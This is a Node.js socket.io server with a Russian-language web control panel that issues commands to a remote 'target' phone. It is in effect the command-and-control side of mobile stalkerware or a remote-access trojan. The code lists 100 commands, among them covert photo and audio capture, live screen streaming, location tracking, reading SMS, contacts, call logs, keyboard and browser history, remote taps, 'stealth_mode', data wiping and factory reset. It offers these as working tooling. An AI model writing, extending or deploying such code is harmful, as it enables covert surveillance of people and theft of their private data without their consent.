const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const sessions = {};

// ===== 100 КОМАНД (справочник для пульта) =====
const COMMANDS = [
  // Камера (1-10)
  'photo_back','photo_front','video_record_start','video_record_stop',
  'camera_flash_on','camera_flash_off','camera_switch','camera_zoom_in',
  'camera_zoom_out','camera_night_mode',
  // Гео (11-20)
  'get_location','get_location_history','track_live','geo_fence_set',
  'geo_fence_alert','get_wifi_info','get_cell_info','get_ip_address',
  'get_last_known','location_off_alert',
  // Файлы (21-30)
  'list_files','download_file','delete_file','upload_file',
  'get_contacts','get_sms','send_sms','get_call_log','make_call','get_calendar',
  // Экран (31-40)
  'screen_capture','screen_record','screen_stream','tap','swipe',
  'type_text','press_home','press_back','press_recent','lock_screen',
  // Звук (41-50)
  'record_audio','play_sound','set_volume','mute','unmute',
  'play_alarm','stop_alarm','get_media_files','play_media','stop_media',
  // Приложения (51-60)
  'list_apps','install_app','uninstall_app','open_app','close_app',
  'get_app_usage','block_app','get_running_apps','clear_app_cache','get_installed_apk',
  // Сеть (61-70)
  'get_wifi_list','connect_wifi','disconnect_wifi','get_bluetooth_devices',
  'enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data',
  'get_network_speed','ping_host',
  // Блокировка (71-80)
  'remote_lock','remote_unlock','wipe_data','change_password','set_pin',
  'get_lock_status','enable_lost_mode','disable_lost_mode','show_message','vibrate',
  // Мониторинг (81-90)
  'get_battery','get_system_info','get_processes','get_sensors','get_clipboard',
  'set_clipboard','get_notifications','get_keyboard_history','get_screenshot_history','get_browser_history',
  // Спец (91-100)
  'stealth_mode','self_destruct','remote_reboot','remote_shutdown','factory_reset',
  'sim_change_alert','sim_info','sos_mode','heartbeat','kill_app'
];

io.on('connection', (socket) => {
  socket.on('register-target', (id) => {
    sessions[id] = sessions[id] || {};
    sessions[id].target = socket.id;
    socket.join(id);
    socket.emit('command-list', COMMANDS);
  });
  socket.on('register-controller', (id) => {
    sessions[id] = sessions[id] || {};
    sessions[id].controller = socket.id;
    socket.join(id);
    socket.emit('command-list', COMMANDS);
  });
  socket.on('command', ({ sessionId, action, data }) => {
    socket.to(sessionId).emit('command', { action, data });
  });
  socket.on('screen', ({ sessionId, image }) => {
    socket.to(sessionId).emit('screen', { image });
  });
  socket.on('result', ({ sessionId, action, result }) => {
    socket.to(sessionId).emit('result', { action, result });
  });
});

// HTML-пульт
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Пульт</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:10px}
h1{font-size:14px;margin:8px 0}
.row{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
input,button,select{background:#111;color:#0f0;border:1px solid #0f0;padding:7px;font-family:monospace;font-size:12px;border-radius:4px}
input{flex:1;min-width:100px}
button{cursor:pointer}
button:active{background:#0f0;color:#000}
#screen{width:100%;max-width:320px;background:#000;border:1px solid #0f0;display:block;margin:8px 0}
#log{background:#000;border:1px solid #333;padding:6px;height:120px;overflow-y:auto;font-size:10px;color:#0a0;white-space:pre-wrap}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:5px}
.grid button{font-size:10px;padding:5px}
.on{color:#0f0}.off{color:#f00}
</style></head><body>

<h1>▶ ПУЛЬТ УПРАВЛЕНИЯ</h1>
<div class="row">
<input id="session" placeholder="ID сессии">
<button onclick="connect()">Подключиться</button>
</div>
<div>Статус: <span id="status" class="off">не подключён</span></div>

<canvas id="screen" width="320" height="570"></canvas>

<div class="row">
<button onclick="cmd('photo_back')">📷 Задн.</button>
<button onclick="cmd('photo_front')">🤳 Фронт.</button>
<button onclick="cmd('get_location')">📍 Гео</button>
<button onclick="cmd('record_audio')">🎤 Микро</button>
</div>
<div class="row">
<input id="msg" placeholder="Сообщение">
<button onclick="cmd('show_message',document.getElementById('msg').value)">Показать</button>
</div>
<div class="row">
<input id="txt" placeholder="Текст для ввода">
<button onclick="cmd('type_text',document.getElementById('txt').value)">Ввод</button>
</div>

<div class="grid">
<button onclick="cmd('screen_capture')">Скриншот</button>
<button onclick="cmd('screen_stream')">Трансляция</button>
<button onclick="cmd('press_home')">Home</button>
<button onclick="cmd('press_back')">Back</button>
<button onclick="cmd('press_recent')">Recent</button>
<button onclick="cmd('lock_screen')">Блок</button>
<button onclick="cmd('play_alarm')">🚨 Сирена</button>
<button onclick="cmd('stop_alarm')">Стоп</button>
<button onclick="cmd('vibrate')">Вибра</button>
<button onclick="cmd('get_battery')">Батарея</button>
<button onclick="cmd('get_sms')">СМС</button>
<button onclick="cmd('get_contacts')">Контакты</button>
<button onclick="cmd('get_call_log')">Звонки</button>
<button onclick="cmd('get_wifi_list')">Wi-Fi</button>
<button onclick="cmd('list_apps')">Приложения</button>
<button onclick="cmd('get_clipboard')">Буфер</button>
<button onclick="cmd('get_notifications')">Уведомл.</button>
<button onclick="cmd('get_system_info')">Система</button>
<button onclick="cmd('remote_lock')">🔒 Lock</button>
<button onclick="cmd('heartbeat')">Пинг</button>
</div>

<h1>📜 ЛОГ</h1>
<div id="log"></div>

<script src="/socket.io/socket.io.js"></script>
<script>
let socket=null,sessionId=null;
function log(t){const e=document.getElementById('log');e.textContent=new Date().toLocaleTimeString()+' '+t+'\\n'+e.textContent}
function setStatus(on){const e=document.getElementById('status');e.textContent=on?'ПОДКЛЮЧЁН':'не подключён';e.className=on?'on':'off'}
function connect(){
 sessionId=document.getElementById('session').value.trim().toUpperCase();
 if(!sessionId)return log('Введите ID');
 if(socket)socket.disconnect();
 socket=io();
 socket.on('connect',()=>{log('OK');socket.emit('register-controller',sessionId);setStatus(true)});
 socket.on('disconnect',()=>{log('off');setStatus(false)});
 socket.on('screen',({image})=>{const i=new Image();i.onload=()=>{const c=document.getElementById('screen');c.getContext('2d').drawImage(i,0,0,c.width,c.height)};i.src='data:image/jpeg;base64,'+image});
 socket.on('result',({action,result})=>log('← '+action+': '+JSON.stringify(result)));
}
function cmd(action,data){
 if(!socket||!socket.connected)return log('Сначала подключитесь');
 socket.emit('command',{sessionId,action,data});
 log('→ '+action+(data?' ('+data+')':''));
}
document.getElementById('screen').addEventListener('click',(e)=>{
 const r=e.target.getBoundingClientRect();
 cmd('tap',{x:Math.round((e.clientX-r.left)/r.width*1000),y:Math.round((e.clientY-r.top)/r.height*1000)});
});
</script>
</body></html>`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('Сервер на ' + PORT));
